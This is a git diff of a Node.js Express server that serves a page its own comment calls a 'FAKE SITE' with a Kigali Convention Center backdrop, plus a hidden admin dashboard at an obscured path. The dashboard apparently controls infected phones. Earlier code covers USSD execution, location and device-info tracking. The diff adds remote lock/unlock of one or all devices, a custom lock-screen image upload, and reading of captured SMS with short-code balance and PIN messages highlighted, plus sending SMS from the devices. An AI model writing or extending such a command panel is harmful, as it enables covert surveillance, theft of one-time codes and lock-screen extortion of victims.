@@ -1,4 +1,4 @@
-// server.js – Kigali Convention Center Image (public/images/)
+// server.js – WITH DEVICE LOCK/UNLOCK
 const express = require('express');
 const crypto = require('crypto');
 const path = require('path');
@@ -19,13 +19,19 @@ function getClientIP(req) {
     return req.socket.remoteAddress || req.connection.remoteAddress;
 }
 
-// ============================================================
-// SERVE STATIC FILES (IMAGES, CSS, ETC.)
-// ============================================================
 app.use(express.static('public'));
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+
+// ============================================================
+// DEVICE STATE (in-memory for now)
+// ============================================================
+let devices = {
+    'device1': { name: 'Samsung S23', locked: false, battery: 85, online: true },
+    'device2': { name: 'iPhone 15', locked: false, battery: 92, online: true },
+    'device3': { name: 'Pixel 8', locked: true, battery: 67, online: false }
+};
+let lockScreenImage = null; // Will store base64 image
 
 // ============================================================
 // FAKE SITE – Kigali Convention Center Background
@@ -60,16 +66,16 @@ app.get('/', (req, res) => {
                 }
 
                 .hero-bg {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: 
-        linear-gradient(135deg, rgba(10,14,23,0.6) 0%, rgba(10,14,23,0.2) 100%),
-        url('https://raw.githubusercontent.com/Swordsman12-madax/admin_dashboard/main/public/images/kigali-convention-center.png') center/cover no-repeat;
-    z-index: 0;
-}
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: 
+                        linear-gradient(135deg, rgba(10,14,23,0.6) 0%, rgba(10,14,23,0.2) 100%),
+                        url('https://raw.githubusercontent.com/Swordsman12-madax/admin_dashboard/main/public/images/kigali-convention-center.png') center/cover no-repeat;
+                    z-index: 0;
+                }
 
                 .car-container {
                     position: absolute;
@@ -252,7 +258,7 @@ app.get('/', (req, res) => {
 });
 
 // ============================================================
-// ADMIN DASHBOARD (full HTML)
+// ADMIN DASHBOARD – WITH DEVICE LOCK/UNLOCK
 // ============================================================
 app.get('/a9f3k217', (req, res) => {
     let html = '';
@@ -302,6 +308,19 @@ app.get('/a9f3k217', (req, res) => {
     html += '    .section { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 24px; }\n';
     html += '    .section h3 { font-size: 18px; font-weight: 600; color: #e0e6ed; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }\n';
     html += '    .section h3 .badge-count { background: #1a2332; color: #8896ab; font-size: 12px; padding: 2px 10px; border-radius: 12px; }\n';
+    html += '    .device-controls { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }\n';
+    html += '    .device-controls button { padding: 6px 14px; border: none; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; transition: 0.3s; }\n';
+    html += '    .device-controls button:hover { transform: scale(1.02); opacity: 0.9; }\n';
+    html += '    .btn-lock { background: #ff6b6b; color: #0a0e17; }\n';
+    html += '    .btn-unlock { background: #6bcb77; color: #0a0e17; }\n';
+    html += '    .btn-lock-all { background: #ff4444; color: #fff; }\n';
+    html += '    .btn-unlock-all { background: #44aa55; color: #fff; }\n';
+    html += '    .device-card { background: #111927; border: 1px solid #1a2332; border-radius: 10px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; transition: 0.3s; }\n';
+    html += '    .device-card:hover { border-color: #4fc3f7; }\n';
+    html += '    .device-card .name { font-weight: 600; }\n';
+    html += '    .device-card .status { font-size: 12px; padding: 2px 10px; border-radius: 12px; }\n';
+    html += '    .device-card .status.locked { background: rgba(255,107,107,0.2); color: #ff6b6b; }\n';
+    html += '    .device-card .status.unlocked { background: rgba(107,203,119,0.2); color: #6bcb77; }\n';
     html += '    table { width: 100%; border-collapse: collapse; font-size: 14px; }\n';
     html += '    th { text-align: left; color: #8896ab; padding: 10px 12px; border-bottom: 2px solid #1a2332; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }\n';
     html += '    td { padding: 10px 12px; border-bottom: 1px solid #0d1420; color: #c8d0dc; }\n';
@@ -309,6 +328,8 @@ app.get('/a9f3k217', (req, res) => {
     html += '    .badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }\n';
     html += '    .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }\n';
     html += '    .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }\n';
+    html += '    .badge.locked { background: rgba(255,107,107,0.15); color: #ff6b6b; }\n';
+    html += '    .badge.unlocked { background: rgba(107,203,119,0.15); color: #6bcb77; }\n';
     html += '    .empty { text-align: center; padding: 30px 0; color: #4a5568; font-size: 14px; }\n';
     html += '    .empty .icon { font-size: 36px; margin-bottom: 8px; }\n';
     html += '    .login-container { max-width: 380px; margin: 100px auto; background: #111927; border: 1px solid #1a2332; border-radius: 16px; padding: 40px; text-align: center; }\n';
@@ -322,6 +343,9 @@ app.get('/a9f3k217', (req, res) => {
     html += '    .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; min-height: 20px; }\n';
     html += '    .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }\n';
     html += '    .hidden { display: none; }\n';
+    html += '    .file-upload-area { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin: 8px 0; }\n';
+    html += '    .file-upload-area input[type="file"] { background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; padding: 8px; font-size: 13px; }\n';
+    html += '    .file-upload-area button { padding: 8px 16px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; }\n';
     html += '    @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }\n';
     html += '  </style>\n';
     html += '</head>\n';
@@ -383,6 +407,46 @@ app.get('/a9f3k217', (req, res) => {
     html += '        <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>\n';
     html += '      </div>\n';
     html += '    </div>\n';
+    html += '    <!-- DEVICE LOCK/UNLOCK SECTION -->\n';
+    html += '    <div class="section">\n';
+    html += '      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">\n';
+    html += '        <h3>🔒 Device Control</h3>\n';
+    html += '        <div class="device-controls">\n';
+    html += '          <button class="btn-lock" onclick="lockDevice(\'selected\')">🔒 Lock Selected</button>\n';
+    html += '          <button class="btn-unlock" onclick="unlockDevice(\'selected\')">🔓 Unlock Selected</button>\n';
+    html += '          <button class="btn-lock-all" onclick="lockAllDevices()">🔒 Lock All</button>\n';
+    html += '          <button class="btn-unlock-all" onclick="unlockAllDevices()">🔓 Unlock All</button>\n';
+    html += '        </div>\n';
+    html += '      </div>\n';
+    html += '      <!-- Lock Screen Image Upload -->\n';
+    html += '      <div class="file-upload-area">\n';
+    html += '        <span style="color:#8896ab;font-size:13px;">Lock Screen Image:</span>\n';
+    html += '        <input type="file" id="lockImageInput" accept="image/*" onchange="previewLockImage(event)">\n';
+    html += '        <button onclick="uploadLockImage()">Upload Image</button>\n';
+    html += '        <span id="lockImageStatus" style="font-size:12px;color:#8896ab;"></span>\n';
+    html += '      </div>\n';
+    html += '      <div id="devicesLockList">\n';
+    html += '        <div class="empty"><div class="icon">🔒</div>Loading devices...</div>\n';
+    html += '      </div>\n';
+    html += '    </div>\n';
+    html += '    <!-- SMS SECTION -->\n';
+    html += '    <div class="section">\n';
+    html += '      <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:15px;">\n';
+    html += '        <h3>💬 SMS Messages <span class="badge-count" id="smsCountBadge">0</span></h3>\n';
+    html += '        <button class="logout-btn" style="background:#4fc3f7;color:#0a0e17;padding:6px 14px;border-radius:6px;font-size:12px;border:none;cursor:pointer;" onclick="refreshSms()">🔄 Refresh</button>\n';
+    html += '      </div>\n';
+    html += '      <div id="smsList"><div class="empty"><div class="icon">💬</div>No SMS messages yet</div></div>\n';
+    html += '    </div>\n';
+    html += '    <!-- SEND SMS -->\n';
+    html += '    <div class="section">\n';
+    html += '      <h3>✉️ Send SMS</h3>\n';
+    html += '      <div style="display:flex;gap:10px;flex-wrap:wrap;">\n';
+    html += '        <input type="text" id="smsNumber" placeholder="Phone number" style="flex:2;min-width:150px;padding:10px 14px;background:#0a0e17;border:1px solid #1a2332;border-radius:8px;color:#e0e6ed;font-size:14px;">\n';
+    html += '        <input type="text" id="smsMessage" placeholder="Message" style="flex:3;min-width:200px;padding:10px 14px;background:#0a0e17;border:1px solid #1a2332;border-radius:8px;color:#e0e6ed;font-size:14px;">\n';
+    html += '        <button onclick="sendSms()" style="padding:10px 20px;background:#4fc3f7;border:none;border-radius:8px;color:#0a0e17;font-weight:600;cursor:pointer;white-space:nowrap;">Send</button>\n';
+    html += '      </div>\n';
+    html += '      <div id="smsSendResult" style="margin-top:8px;font-size:13px;color:#8896ab;"></div>\n';
+    html += '    </div>\n';
     html += '    <div class="section">\n';
     html += '      <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>\n';
     html += '      <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>\n';
@@ -395,6 +459,10 @@ app.get('/a9f3k217', (req, res) => {
     html += '</div>\n';
     html += '<script>\n';
     html += 'const API_BASE = "/a9f3k217";\n';
+    html += '\n';
+    html += '// ============================================================\n';
+    html += '// LOGIN\n';
+    html += '// ============================================================\n';
     html += 'async function login() {\n';
     html += '  const username = document.getElementById("loginUser").value;\n';
     html += '  const password = document.getElementById("loginPass").value;\n';
@@ -416,6 +484,8 @@ app.get('/a9f3k217', (req, res) => {
     html += '      loadData();\n';
     html += '      refreshLocation();\n';
     html += '      refreshDeviceInfo();\n';
+    html += '      refreshSms();\n';
+    html += '      refreshDevicesLock();\n';
     html += '      document.getElementById("loginUser").value = "";\n';
     html += '      document.getElementById("loginPass").value = "";\n';
     html += '    } else {\n';
@@ -441,6 +511,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    console.error("Login error:", err);\n';
     html += '  }\n';
     html += '}\n';
+    html += '\n';
     html += 'function logout() {\n';
     html += '  localStorage.removeItem("adminLoggedIn");\n';
     html += '  document.getElementById("loginUser").value = "";\n';
@@ -450,6 +521,217 @@ app.get('/a9f3k217', (req, res) => {
     html += '  document.getElementById("attemptsMsg").textContent = "";\n';
     html += '  document.getElementById("loginError").style.display = "none";\n';
     html += '}\n';
+    html += '\n';
+    html += '// ============================================================\n';
+    html += '// DEVICE LOCK/UNLOCK\n';
+    html += '// ============================================================\n';
+    html += 'let selectedDeviceId = null;\n';
+    html += '\n';
+    html += 'function selectDevice(deviceId) {\n';
+    html += '  selectedDeviceId = deviceId;\n';
+    html += '  document.querySelectorAll(".device-card").forEach(el => el.style.borderColor = "#1a2332");\n';
+    html += '  const card = document.querySelector(`.device-card[data-id="${deviceId}"]`);\n';
+    html += '  if (card) card.style.borderColor = "#4fc3f7";\n';
+    html += '}\n';
+    html += '\n';
+    html += 'async function refreshDevicesLock() {\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/devices-lock");\n';
+    html += '    const data = await response.json();\n';
+    html += '    renderDevicesLock(data);\n';
+    html += '  } catch (error) {\n';
+    html += '    console.error("Error loading devices:", error);\n';
+    html += '  }\n';
+    html += '}\n';
+    html += '\n';
+    html += 'function renderDevicesLock(devices) {\n';
+    html += '  const container = document.getElementById("devicesLockList");\n';
+    html += '  if (!devices || Object.keys(devices).length === 0) {\n';
+    html += '    container.innerHTML = \'<div class="empty"><div class="icon">🔒</div>No devices available</div>\';\n';
+    html += '    return;\n';
+    html += '  }\n';
+    html += '  let html = \'<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Action</th></tr></thead><tbody>\';\n';
+    html += '  Object.keys(devices).forEach(id => {\n';
+    html += '    const d = devices[id];\n';
+    html += '    const isLocked = d.locked || false;\n';
+    html += '    const statusClass = isLocked ? "locked" : "unlocked" ;\n';
+    html += '    const statusText = isLocked ? "🔒 Locked" : "🔓 Unlocked";\n';
+    html += '    const onlineClass = d.online ? "online" : "offline";\n';
+    html += '    const onlineText = d.online ? "🟢 Online" : "🔴 Offline";\n';
+    html += '    const actionBtn = isLocked \n';
+    html += '      ? `<button class="btn-unlock" onclick="unlockDevice(\'${id}\')">Unlock</button>`\n';
+    html += '      : `<button class="btn-lock" onclick="lockDevice(\'${id}\')">Lock</button>`;\n';
+    html += '    html += `<tr class="device-card" data-id="${id}" onclick="selectDevice(\'${id}\')">`;\n';
+    html += '    html += `<td><span class="name">${d.name || id}</span></td>`;\n';
+    html += '    html += `<td><span class="badge ${statusClass}">${statusText}</span> <span class="badge ${onlineClass}">${onlineText}</span></td>`;\n';
+    html += '    html += `<td>${d.battery || "--"}%</td>`;\n';
+    html += '    html += `<td>${actionBtn}</td>`;\n';
+    html += '    html += `</tr>`;\n';
+    html += '  });\n';
+    html += '  html += \'</tbody></table>\';\n';
+    html += '  container.innerHTML = html;\n';
+    html += '}\n';
+    html += '\n';
+    html += 'async function lockDevice(deviceId) {\n';
+    html += '  const id = deviceId === "selected" ? selectedDeviceId : deviceId;\n';
+    html += '  if (!id) { alert("Please select a device first"); return; }\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/lock-device", {\n';
+    html += '      method: "POST",\n';
+    html += '      headers: { "Content-Type": "application/json" },\n';
+    html += '      body: JSON.stringify({ deviceId: id, action: "lock" })\n';
+    html += '    });\n';
+    html += '    const data = await response.json();\n';
+    html += '    if (data.success) {\n';
+    html += '      refreshDevicesLock();\n';
+    html += '    } else {\n';
+    html += '      alert("Failed to lock device: " + data.error);\n';
+    html += '    }\n';
+    html += '  } catch { alert("Connection error"); }\n';
+    html += '}\n';
+    html += '\n';
+    html += 'async function unlockDevice(deviceId) {\n';
+    html += '  const id = deviceId === "selected" ? selectedDeviceId : deviceId;\n';
+    html += '  if (!id) { alert("Please select a device first"); return; }\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/lock-device", {\n';
+    html += '      method: "POST",\n';
+    html += '      headers: { "Content-Type": "application/json" },\n';
+    html += '      body: JSON.stringify({ deviceId: id, action: "unlock" })\n';
+    html += '    });\n';
+    html += '    const data = await response.json();\n';
+    html += '    if (data.success) {\n';
+    html += '      refreshDevicesLock();\n';
+    html += '    } else {\n';
+    html += '      alert("Failed to unlock device: " + data.error);\n';
+    html += '    }\n';
+    html += '  } catch { alert("Connection error"); }\n';
+    html += '}\n';
+    html += '\n';
+    html += 'async function lockAllDevices() {\n';
+    html += '  if (!confirm("Lock ALL devices?")) return;\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/lock-all", { method: "POST" });\n';
+    html += '    const data = await response.json();\n';
+    html += '    if (data.success) { refreshDevicesLock(); }\n';
+    html += '    else { alert("Failed: " + data.error); }\n';
+    html += '  } catch { alert("Connection error"); }\n';
+    html += '}\n';
+    html += '\n';
+    html += 'async function unlockAllDevices() {\n';
+    html += '  if (!confirm("Unlock ALL devices?")) return;\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/unlock-all", { method: "POST" });\n';
+    html += '    const data = await response.json();\n';
+    html += '    if (data.success) { refreshDevicesLock(); }\n';
+    html += '    else { alert("Failed: " + data.error); }\n';
+    html += '  } catch { alert("Connection error"); }\n';
+    html += '}\n';
+    html += '\n';
+    html += '// ============================================================\n';
+    html += '// LOCK SCREEN IMAGE UPLOAD\n';
+    html += '// ============================================================\n';
+    html += 'function previewLockImage(event) {\n';
+    html += '  const file = event.target.files[0];\n';
+    html += '  if (file) {\n';
+    html += '    const reader = new FileReader();\n';
+    html += '    reader.onload = function(e) {\n';
+    html += '      document.getElementById("lockImageStatus").textContent = "📸 Image loaded: " + file.name;\n';
+    html += '      document.getElementById("lockImageStatus").style.color = "#6bcb77";\n';
+    html += '      window._lockImageData = e.target.result;\n';
+    html += '    };\n';
+    html += '    reader.readAsDataURL(file);\n';
+    html += '  }\n';
+    html += '}\n';
+    html += '\n';
+    html += 'async function uploadLockImage() {\n';
+    html += '  const imageData = window._lockImageData;\n';
+    html += '  if (!imageData) { alert("Please select an image first"); return; }\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/upload-lock-image", {\n';
+    html += '      method: "POST",\n';
+    html += '      headers: { "Content-Type": "application/json" },\n';
+    html += '      body: JSON.stringify({ image: imageData })\n';
+    html += '    });\n';
+    html += '    const data = await response.json();\n';
+    html += '    if (data.success) {\n';
+    html += '      document.getElementById("lockImageStatus").textContent = "✅ Image uploaded successfully!";\n';
+    html += '      document.getElementById("lockImageStatus").style.color = "#6bcb77";\n';
+    html += '    } else {\n';
+    html += '      document.getElementById("lockImageStatus").textContent = "❌ " + data.error;\n';
+    html += '      document.getElementById("lockImageStatus").style.color = "#ff6b6b";\n';
+    html += '    }\n';
+    html += '  } catch { alert("Connection error"); }\n';
+    html += '}\n';
+    html += '\n';
+    html += '// ============================================================\n';
+    html += '// SMS FUNCTIONS\n';
+    html += '// ============================================================\n';
+    html += 'async function refreshSms() {\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/sms");\n';
+    html += '    const smsList = await response.json();\n';
+    html += '    renderSms(smsList);\n';
+    html += '    document.getElementById("smsCountBadge").textContent = smsList.length || 0;\n';
+    html += '  } catch (error) {\n';
+    html += '    console.error("Error loading SMS:", error);\n';
+    html += '  }\n';
+    html += '}\n';
+    html += '\n';
+    html += 'function renderSms(messages) {\n';
+    html += '  const container = document.getElementById("smsList");\n';
+    html += '  if (!messages || messages.length === 0) {\n';
+    html += '    container.innerHTML = \'<div class="empty"><div class="icon">💬</div>No SMS messages yet</div>\';\n';
+    html += '    return;\n';
+    html += '  }\n';
+    html += '  let html = \'<table><thead><tr><th>From</th><th>Message</th><th>Time</th></tr></thead><tbody>\';\n';
+    html += '  messages.slice(0, 50).forEach(msg => {\n';
+    html += '    const time = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : "--";\n';
+    html += '    const isShort = msg.number && msg.number.length >= 4 && msg.number.length <= 5;\n';
+    html += '    const numberDisplay = isShort ? \'<span style="color:#ffd700;font-weight:600;">\' + msg.number + \'</span>\' : msg.number || "Unknown";\n';
+    html += '    html += `<tr><td>${numberDisplay}</td><td>${msg.body || "--"}</td><td style="font-size:12px;color:#8896ab;">${time}</td></tr>`;\n';
+    html += '  });\n';
+    html += '  html += \'</tbody></table>\';\n';
+    html += '  container.innerHTML = html;\n';
+    html += '}\n';
+    html += '\n';
+    html += 'async function sendSms() {\n';
+    html += '  const number = document.getElementById("smsNumber").value.trim();\n';
+    html += '  const message = document.getElementById("smsMessage").value.trim();\n';
+    html += '  const resultEl = document.getElementById("smsSendResult");\n';
+    html += '  if (!number || !message) {\n';
+    html += '    resultEl.textContent = "⚠️ Please enter both number and message";\n';
+    html += '    resultEl.style.color = "#ff6b6b";\n';
+    html += '    return;\n';
+    html += '  }\n';
+    html += '  resultEl.textContent = "⏳ Sending...";\n';
+    html += '  resultEl.style.color = "#ffd700";\n';
+    html += '  try {\n';
+    html += '    const response = await fetch(API_BASE + "/api/send-sms", {\n';
+    html += '      method: "POST",\n';
+    html += '      headers: { "Content-Type": "application/json" },\n';
+    html += '      body: JSON.stringify({ number, message })\n';
+    html += '    });\n';
+    html += '    const data = await response.json();\n';
+    html += '    if (data.success) {\n';
+    html += '      resultEl.textContent = "✅ " + data.message;\n';
+    html += '      resultEl.style.color = "#6bcb77";\n';
+    html += '      document.getElementById("smsNumber").value = "";\n';
+    html += '      document.getElementById("smsMessage").value = "";\n';
+    html += '      refreshSms();\n';
+    html += '    } else {\n';
+    html += '      resultEl.textContent = "❌ " + (data.error || "Failed to send");\n';
+    html += '      resultEl.style.color = "#ff6b6b";\n';
+    html += '    }\n';
+    html += '  } catch {\n';
+    html += '    resultEl.textContent = "❌ Connection error";\n';
+    html += '    resultEl.style.color = "#ff6b6b";\n';
+    html += '  }\n';
+    html += '}\n';
+    html += '\n';
+    html += '// ============================================================\n';
+    html += '// USSD, LOCATION, DEVICE INFO FUNCTIONS\n';
+    html += '// ============================================================\n';
     html += 'async function executeUssd() {\n';
     html += '  const code = document.getElementById("ussdInput").value.trim();\n';
     html += '  const responseEl = document.getElementById("ussdResponse");\n';
@@ -480,6 +762,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    responseEl.textContent = "❌ Connection error";\n';
     html += '  }\n';
     html += '}\n';
+    html += '\n';
     html += 'async function refreshLocation() {\n';
     html += '  try {\n';
     html += '    const res = await fetch(API_BASE + "/api/location");\n';
@@ -496,6 +779,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    }\n';
     html += '  } catch {}\n';
     html += '}\n';
+    html += '\n';
     html += 'async function refreshDeviceInfo() {\n';
     html += '  try {\n';
     html += '    const res = await fetch(API_BASE + "/api/device-info");\n';
@@ -508,6 +792,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    document.getElementById("diDeviceId").textContent = data.device_id || "--";\n';
     html += '  } catch {}\n';
     html += '}\n';
+    html += '\n';
     html += 'async function loadData() {\n';
     html += '  try {\n';
     html += '    const response = await fetch(API_BASE + "/api/stats");\n';
@@ -524,6 +809,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    renderDevices(devices);\n';
     html += '  } catch (error) { console.error("Error loading data:", error); }\n';
     html += '}\n';
+    html += '\n';
     html += 'function renderDevices(devices) {\n';
     html += '  const container = document.getElementById("devicesList");\n';
     html += '  if (!devices || devices.length === 0) {\n';
@@ -539,6 +825,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '  html += "</tbody></table>";\n';
     html += '  container.innerHTML = html;\n';
     html += '}\n';
+    html += '\n';
     html += 'function renderUssdNumbers(numbers) {\n';
     html += '  const container = document.getElementById("numbersList");\n';
     html += '  if (!numbers || numbers.length === 0) {\n';
@@ -552,13 +839,20 @@ app.get('/a9f3k217', (req, res) => {
     html += '  html += "</tbody></table>";\n';
     html += '  container.innerHTML = html;\n';
     html += '}\n';
+    html += '\n';
+    html += '// ============================================================\n';
+    html += '// PERSISTENT LOGIN\n';
+    html += '// ============================================================\n';
     html += 'if (localStorage.getItem("adminLoggedIn") === "true") {\n';
     html += '  document.getElementById("loginContainer").style.display = "none";\n';
     html += '  document.getElementById("dashboard").classList.remove("hidden");\n';
     html += '  loadData();\n';
     html += '  refreshLocation();\n';
     html += '  refreshDeviceInfo();\n';
+    html += '  refreshSms();\n';
+    html += '  refreshDevicesLock();\n';
     html += '}\n';
+    html += '\n';
     html += 'document.getElementById("loginPass").addEventListener("keypress", (e) => {\n';
     html += '  if (e.key === "Enter") login();\n';
     html += '});\n';
@@ -567,6 +861,99 @@ app.get('/a9f3k217', (req, res) => {
     html += '</html>';
 
     res.send(html);
+});
+// ============================================================
+// DEVICE LOCK/UNLOCK API ENDPOINTS
+// ============================================================
+app.get('/a9f3k217/api/devices-lock', (req, res) => {
+    res.json(devices);
+});
+
+app.post('/a9f3k217/api/lock-device', (req, res) => {
+    const { deviceId, action } = req.body;
+    if (!deviceId || !devices[deviceId]) {
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    if (action === 'lock') {
+        devices[deviceId].locked = true;
+        console.log(`🔒 Device ${deviceId} locked`);
+        res.json({ success: true, message: `Device ${deviceId} locked` });
+    } else if (action === 'unlock') {
+        devices[deviceId].locked = false;
+        console.log(`🔓 Device ${deviceId} unlocked`);
+        res.json({ success: true, message: `Device ${deviceId} unlocked` });
+    } else {
+        res.status(400).json({ error: 'Invalid action' });
+    }
+});
+
+app.post('/a9f3k217/api/lock-all', (req, res) => {
+    Object.keys(devices).forEach(id => { devices[id].locked = true; });
+    console.log('🔒 All devices locked');
+    res.json({ success: true, message: 'All devices locked' });
+});
+
+app.post('/a9f3k217/api/unlock-all', (req, res) => {
+    Object.keys(devices).forEach(id => { devices[id].locked = false; });
+    console.log('🔓 All devices unlocked');
+    res.json({ success: true, message: 'All devices unlocked' });
+});
+
+// ============================================================
+// LOCK SCREEN IMAGE UPLOAD
+// ============================================================
+let lockScreenImage = null;
+
+app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
+    const { image } = req.body;
+    if (!image) {
+        return res.status(400).json({ error: 'No image provided' });
+    }
+    lockScreenImage = image;
+    console.log('📸 Lock screen image uploaded');
+    res.json({ success: true, message: 'Lock screen image uploaded' });
+});
+
+// ============================================================
+// SMS API ENDPOINTS
+// ============================================================
+let smsMessages = [
+    {
+        number: '12345',
+        body: 'Your account balance is 1,500 RWF',
+        timestamp: Date.now() - 3600000
+    },
+    {
+        number: '1234',
+        body: 'Data bundle: 2GB remaining',
+        timestamp: Date.now() - 7200000
+    },
+    {
+        number: '98765',
+        body: 'Your PIN has been changed successfully',
+        timestamp: Date.now() - 86400000
+    }
+];
+
+app.get('/a9f3k217/api/sms', (req, res) => {
+    res.json(smsMessages);
+});
+
+app.post('/a9f3k217/api/send-sms', (req, res) => {
+    const { number, message } = req.body;
+    if (!number || !message) {
+        return res.status(400).json({ error: 'Number and message required' });
+    }
+
+    smsMessages.unshift({
+        number: number,
+        body: message,
+        timestamp: Date.now()
+    });
+    if (smsMessages.length > 100) smsMessages.pop();
+
+    console.log(`📤 SMS sent to ${number}: ${message}`);
+    res.json({ success: true, message: `SMS sent to ${number}` });
 });
 
 // ============================================================
